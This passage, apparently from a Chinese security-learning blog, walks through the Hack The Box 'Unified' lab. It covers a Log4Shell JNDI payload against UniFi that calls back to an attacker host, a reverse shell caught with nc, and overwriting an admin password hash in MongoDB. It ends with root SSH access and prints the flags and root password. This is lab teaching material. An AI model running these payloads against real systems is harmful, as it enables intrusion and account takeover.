+</span></span><span class="line"><span class="cl">Apache Maven 3.9.12
+</span></span><span class="line"><span class="cl">Maven home: /usr/share/maven
+</span></span><span class="line"><span class="cl">Java version: 11.0.31, vendor: Debian, runtime: /usr/lib/jvm/java-11-openjdk-amd64
+</span></span><span class="line"><span class="cl">Default locale: en_US, platform encoding: UTF-8
+</span></span><span class="line"><span class="cl">OS name: <span class="s2">&#34;linux&#34;</span>, version: <span class="s2">&#34;6.19.14+kali-amd64&#34;</span>, arch: <span class="s2">&#34;amd64&#34;</span>, family: <span class="s2">&#34;unix&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>克隆 <code>Log4jUnifi</code> 这个仓库，并编译其中的 <code>utils/rogue-jndi</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Unified<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# git clone --recurse-submodules https://github.com/puzzlepeaches/Log4jUnifi
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Unified<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# <span class="nb">cd</span> Log4jUnifi 
+</span></span><span class="line"><span class="cl">                                                                                      
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Unified/Log4jUnifi<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# python3 -m venv venv                        
+</span></span><span class="line"><span class="cl">                                                                                 
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Unified/Log4jUnifi<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# <span class="nb">source</span> venv/bin/activate
+</span></span><span class="line"><span class="cl">                                                                                    
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>venv<span class="o">)</span>─<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Unified/Log4jUnifi<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# pip install -r requirements.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>venv<span class="o">)</span>─<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Unified/Log4jUnifi<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# <span class="nb">cd</span> utils/rogue-jndi 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>venv<span class="o">)</span>─<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/…/Unified/Log4jUnifi/utils/rogue-jndi<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# mvn package 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后进行利用</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>venv<span class="o">)</span>─<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Unified/Log4jUnifi<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# python3 exploit.py -u https://10.129.96.149:8443 -i 10.10.16.102 -p <span class="m">1234</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Starting malicous JNDI Server
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;username&#34;</span>: <span class="s2">&#34;</span><span class="si">${</span><span class="nv">jndi</span><span class="p">:</span><span class="nv">ldap</span><span class="p">://10.10.16.102:</span><span class="nv">1389</span><span class="p">/o=tomcat</span><span class="si">}</span><span class="s2">&#34;</span>, <span class="s2">&#34;password&#34;</span>: <span class="s2">&#34;log4j&#34;</span>, <span class="s2">&#34;remember&#34;</span>: <span class="s2">&#34;</span><span class="si">${</span><span class="nv">jndi</span><span class="p">:</span><span class="nv">ldap</span><span class="p">://10.10.16.102:</span><span class="nv">1389</span><span class="p">/o=tomcat</span><span class="si">}</span><span class="s2">&#34;</span>, <span class="s2">&#34;strict&#34;</span>:true<span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Firing payload!
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Check <span class="k">for</span> a callback!
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Unified<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nc -lvnp <span class="m">1234</span>                                       
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">1234</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.16.102<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.129.96.149<span class="o">]</span> <span class="m">46512</span>
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>999<span class="o">(</span>unifi<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>999<span class="o">(</span>unifi<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>999<span class="o">(</span>unifi<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>将 shell 升级为完整 TTY：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">script -qc /bin/bash /dev/null
+</span></span><span class="line"><span class="cl">Ctrl + Z
+</span></span><span class="line"><span class="cl">stty raw -echo<span class="p">;</span><span class="nb">fg</span>
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>获取 user flag</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">unifi@unified:/usr/lib/unifi$ ls -l /home
+</span></span><span class="line"><span class="cl">total <span class="m">4</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> <span class="m">1000</span> <span class="m">1000</span> <span class="m">4096</span> Jan  <span class="m">2</span>  <span class="m">2022</span> michael
+</span></span><span class="line"><span class="cl">unifi@unified:/usr/lib/unifi$ <span class="nb">cd</span> /home/michael/<span class="p">;</span>cat user.txt
+</span></span><span class="line"><span class="cl">6ced1a6a89e666c0620cdb10262ba127
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>答案：6ced1a6a89e666c0620cdb10262ba127</strong></p>
+<h3 id="task-9">Task 9
+</h3><blockquote>
+<p>What port is the MongoDB service running on?</p>
+<p>MongoDB 服务运行在哪个端口上？</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">unifi@unified:/home/michael$ ps -ef
+</span></span><span class="line"><span class="cl">UID          PID    PPID  C STIME TTY          TIME CMD
+</span></span><span class="line"><span class="cl">unifi          <span class="m">1</span>       <span class="m">0</span>  <span class="m">0</span> 05:30 ?        00:00:00 /sbin/docker-init -- /usr/lo
+</span></span><span class="line"><span class="cl">unifi          <span class="m">7</span>       <span class="m">1</span>  <span class="m">0</span> 05:30 ?        00:00:00 bash /usr/local/bin/docker-e
+</span></span><span class="line"><span class="cl">unifi         <span class="m">17</span>       <span class="m">7</span>  <span class="m">0</span> 05:30 ?        00:00:43 java -Dunifi.datadir<span class="o">=</span>/unifi/
+</span></span><span class="line"><span class="cl">unifi         <span class="m">67</span>      <span class="m">17</span>  <span class="m">0</span> 05:31 ?        00:00:12 bin/mongod --dbpath /usr/lib
+</span></span><span class="line"><span class="cl">unifi       <span class="m">1872</span>      <span class="m">17</span>  <span class="m">0</span> 06:36 ?        00:00:00 bash -c <span class="o">{</span>echo,YmFzaCAtYyBiYX
+</span></span><span class="line"><span class="cl">unifi       <span class="m">1876</span>    <span class="m">1872</span>  <span class="m">0</span> 06:36 ?        00:00:00 bash -i
+</span></span><span class="line"><span class="cl">unifi       <span class="m">1879</span>    <span class="m">1876</span>  <span class="m">0</span> 06:36 ?        00:00:00 bash
+</span></span><span class="line"><span class="cl">unifi       <span class="m">1948</span>    <span class="m">1879</span>  <span class="m">0</span> 06:38 ?        00:00:00 script -qc /bin/bash /dev/nu
+</span></span><span class="line"><span class="cl">unifi       <span class="m">1949</span>    <span class="m">1948</span>  <span class="m">0</span> 06:38 pts/0    00:00:00 sh -c /bin/bash
+</span></span><span class="line"><span class="cl">unifi       <span class="m">1950</span>    <span class="m">1949</span>  <span class="m">0</span> 06:38 pts/0    00:00:00 /bin/bash
+</span></span><span class="line"><span class="cl">unifi       <span class="m">2216</span>    <span class="m">1950</span>  <span class="m">0</span> 06:47 pts/0    00:00:00 ps -ef
+</span></span><span class="line"><span class="cl">unifi@unified:/home/michael$ ps -ef <span class="p">|</span> grep mongod
+</span></span><span class="line"><span class="cl">unifi         <span class="m">67</span>      <span class="m">17</span>  <span class="m">0</span> 05:31 ?        00:00:12 bin/mongod --dbpath /usr/lib/unifi/data/db --port <span class="m">27117</span> --unixSocketPrefix /usr/lib/unifi/run --logRotate reopen --logappend --logpath /usr/lib/unifi/logs/mongod.log --pidfilepath /usr/lib/unifi/run/mongod.pid --bind_ip 127.0.0.1
+</span></span><span class="line"><span class="cl">unifi       <span class="m">2247</span>    <span class="m">1950</span>  <span class="m">0</span> 06:49 pts/0    00:00:00 grep mongod
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可知端口为 27117</p>
+<p><strong>答案：27117</strong></p>
+<h3 id="task-10">Task 10
+</h3><blockquote>
+<p>What is the default database name for UniFi applications?</p>
+<p>UniFi应用程序的默认数据库名称是什么？</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">unifi@unified:/home/michael$ mongo --port <span class="m">27117</span>
+</span></span><span class="line"><span class="cl">MongoDB shell version v3.6.3
+</span></span><span class="line"><span class="cl">connecting to: mongodb://127.0.0.1:27117/
+</span></span><span class="line"><span class="cl">MongoDB server version: 3.6.3
+</span></span><span class="line"><span class="cl">Welcome to the MongoDB shell.
+</span></span><span class="line"><span class="cl">For interactive help, <span class="nb">type</span> <span class="s2">&#34;help&#34;</span>.
+</span></span><span class="line"><span class="cl">For more comprehensive documentation, see
+</span></span><span class="line"><span class="cl">        http://docs.mongodb.org/
+</span></span><span class="line"><span class="cl">Questions? Try the support group
+</span></span><span class="line"><span class="cl">        http://groups.google.com/group/mongodb-user
+</span></span><span class="line"><span class="cl">2026-11-07T06:51:53.998+0000 I STORAGE  <span class="o">[</span>main<span class="o">]</span> In File::open<span class="o">()</span>, ::open <span class="k">for</span> <span class="s1">&#39;/home/unifi/.mongorc.js&#39;</span> failed with No such file or directory
+</span></span><span class="line"><span class="cl">Server has startup warnings: 
+</span></span><span class="line"><span class="cl">2026-11-07T05:31:01.157+0000 I STORAGE  <span class="o">[</span>initandlisten<span class="o">]</span> 
+</span></span><span class="line"><span class="cl">2026-11-07T05:31:01.157+0000 I STORAGE  <span class="o">[</span>initandlisten<span class="o">]</span> ** WARNING: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine
+</span></span><span class="line"><span class="cl">2026-11-07T05:31:01.157+0000 I STORAGE  <span class="o">[</span>initandlisten<span class="o">]</span> **          See http://dochub.mongodb.org/core/prodnotes-filesystem
+</span></span><span class="line"><span class="cl">2026-11-07T05:31:02.249+0000 I CONTROL  <span class="o">[</span>initandlisten<span class="o">]</span> 
+</span></span><span class="line"><span class="cl">2026-11-07T05:31:02.249+0000 I CONTROL  <span class="o">[</span>initandlisten<span class="o">]</span> ** WARNING: Access control is not enabled <span class="k">for</span> the database.
+</span></span><span class="line"><span class="cl">2026-11-07T05:31:02.249+0000 I CONTROL  <span class="o">[</span>initandlisten<span class="o">]</span> **          Read and write access to data and configuration is unrestricted.
+</span></span><span class="line"><span class="cl">2026-11-07T05:31:02.249+0000 I CONTROL  <span class="o">[</span>initandlisten<span class="o">]</span> 
+</span></span><span class="line"><span class="cl">&gt; show dbs
+</span></span><span class="line"><span class="cl">ace       0.002GB
+</span></span><span class="line"><span class="cl">ace_stat  0.000GB
+</span></span><span class="line"><span class="cl">admin     0.000GB
+</span></span><span class="line"><span class="cl">config    0.000GB
+</span></span><span class="line"><span class="cl"><span class="nb">local</span>     0.000GB
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>mongo --port 27117</code> 连接数据库，<code>show dbs</code> 列出全部数据库。</p>
+<p><code>admin / config /local</code> 都是 MongoDB 自带库，<code>ace_stat</code> 是统计数据库。</p>
+<p><strong>答案：ace</strong></p>
+<h3 id="task-11">Task 11
+</h3><blockquote>
+<p>What is the function we use to enumerate users within the database in MongoDB?</p>
+<p>在 MongoDB 中，我们使用什么函数来枚举数据库中的用户？</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; use ace
+</span></span><span class="line"><span class="cl">switched to db ace
+</span></span><span class="line"><span class="cl">&gt; db.admin.find<span class="o">()</span>
+</span></span><span class="line"><span class="cl"><span class="o">{</span> <span class="s2">&#34;_id&#34;</span> : ObjectId<span class="o">(</span><span class="s2">&#34;61ce278f46e0fb0012d47ee4&#34;</span><span class="o">)</span>, <span class="s2">&#34;name&#34;</span> : <span class="s2">&#34;administrator&#34;</span>, <span class="s2">&#34;email&#34;</span> : <span class="s2">&#34;administrator@unified.htb&#34;</span>, <span class="s2">&#34;x_shadow&#34;</span> : <span class="s2">&#34;</span><span class="nv">$6$Ry6Vdbse$8</span><span class="s2">enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.&#34;</span>, ......
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>答案：db.admin.find()</strong></p>
+<h3 id="task-12">Task 12
+</h3><blockquote>
+<p>What is the function we use to update users within the database in MongoDB?</p>
+<p>在 MongoDB 数据库中，我们使用什么函数来更新数据库中的用户？</p>
+</blockquote>
+<p>使用 <code>db.admin.update()</code> 来更新用户。主要是修改 <code>x_shadow</code> 中的密码，这密码是 <code>SHA-512</code> 加盐 crypt 哈希，格式为 <code>$6$盐值$哈希值</code>。</p>
+<p>先生成一个密码，对应明文为 123456：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>venv<span class="o">)</span>─<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Unified/Log4jUnifi<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# mkpasswd -m sha-512 <span class="m">123456</span>  
+</span></span><span class="line"><span class="cl"><span class="nv">$6$tj52j4UtUCgihgeT$BNzysUrcKPDaPNLhqOyToc62z4lw20hCI8YsD55AZCIm1N02KHArRTCZEWJsvDZGbJmoCI56iVjAXb4jVg2tK</span>.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后更新 admin 密码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">db.admin.update<span class="o">({</span><span class="s2">&#34;_id&#34;</span> : ObjectId<span class="o">(</span><span class="s2">&#34;61ce278f46e0fb0012d47ee4&#34;</span><span class="o">)}</span>,<span class="o">{</span><span class="nv">$set</span>: <span class="o">{</span> x_shadow: <span class="s2">&#34;</span><span class="nv">$6$tj52j4UtUCgihgeT$BNzysUrcKPDaPNLhqOyToc62z4lw20hCI8YsD55AZCIm1N02KHArRTCZEWJsvDZGbJmoCI56iVjAXb4jVg2tK</span><span class="s2">.&#34;</span> <span class="o">}</span> <span class="o">})</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>答案：db.admin.update()</strong></p>
+<h3 id="task-13">Task 13
+</h3><blockquote>
+<p>What is the password for the root user?</p>
+<p>root用户的密码是什么？</p>
+</blockquote>
+<p>先使用我们修改的账密 administrator:123456 登录 8443。</p>
+<p>在系统设置 -&gt; Site 中找到 root 的 SSH 密码。</p>
+<p><img src="/p/13.-unified/assets/image-20261107150849776.png"
+	width="2095"
+	height="1109"
+	srcset="/p/13.-unified/assets/image-20261107150849776_hu624201679408822513.png 480w, /p/13.-unified/assets/image-20261107150849776_hu14894084560023790889.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261107150849776"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="188"
+		data-flex-basis="453px"
+	
+></p>
+<p><strong>答案：NotACrackablePassword4U2022</strong></p>
+<h3 id="submit-root-flag">Submit Root Flag
+</h3><blockquote>
+<p>Submit the flag located in root&rsquo;s home directory.</p>
+<p>提交位于 root 用户主目录中的 flag。</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>venv<span class="o">)</span>─<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Unified/Log4jUnifi<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# ssh root@10.129.96.149  
+</span></span><span class="line"><span class="cl">The authenticity of host <span class="s1">&#39;10.129.96.149 (10.129.96.149)&#39;</span> can<span class="s1">&#39;t be established.
+</span></span></span><span class="line"><span class="cl"><span class="s1">ED25519 key fingerprint is: SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A
+</span></span></span><span class="line"><span class="cl"><span class="s1">This key is not known by any other names.
+</span></span></span><span class="line"><span class="cl"><span class="s1">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span></span><span class="line"><span class="cl"><span class="s1">Warning: Permanently added &#39;</span>10.129.96.149<span class="s1">&#39; (ED25519) to the list of known hosts.
+</span></span></span><span class="line"><span class="cl"><span class="s1">** WARNING: connection is not using a post-quantum key exchange algorithm.
+</span></span></span><span class="line"><span class="cl"><span class="s1">** This session may be vulnerable to &#34;store now, decrypt later&#34; attacks.
+</span></span></span><span class="line"><span class="cl"><span class="s1">** The server may need to be upgraded. See https://openssh.com/pq.html
+</span></span></span><span class="line"><span class="cl"><span class="s1">root@10.129.96.149&#39;</span>s password: 
+</span></span><span class="line"><span class="cl">Welcome to Ubuntu 20.04.3 LTS <span class="o">(</span>GNU/Linux 5.4.0-77-generic x86_64<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> * Documentation:  https://help.ubuntu.com
+</span></span><span class="line"><span class="cl"> * Management:     https://landscape.canonical.com
+</span></span><span class="line"><span class="cl"> * Support:        https://ubuntu.com/advantage
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> * Super-optimized <span class="k">for</span> small spaces - <span class="nb">read</span> how we shrank the memory
+</span></span><span class="line"><span class="cl">   footprint of MicroK8s to make it the smallest full K8s around.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   https://ubuntu.com/blog/microk8s-memory-optimisation
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Last login: Sat Nov  <span class="m">7</span> 06:54:21 <span class="m">2026</span> from 10.10.16.146
+</span></span><span class="line"><span class="cl">root@unified:~# cat root.txt
+</span></span><span class="line"><span class="cl">e50bc93c75b634e4b272d2f771c33681
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>答案：e50bc93c75b634e4b272d2f771c33681</strong></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/htb-starting-point-%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97/">
+        
+        
+            <div class="article-image">
+                <img src="/p/htb-starting-point-%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97/assets/image-20261104205444073.d9e4fd976e03998d17a7cc2012db183c_hu3527743922139951764.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HTB Starting Point 入门系列"
+                        
+                        data-hash="md5-2eT9l24DmY0Xp8wgEtsYPA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HTB Starting Point 入门系列</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2026 Sp1ke
+    </section>
+    
+    <section class="powerby">
+        
+            记录安全学习 <br/>
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.26.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
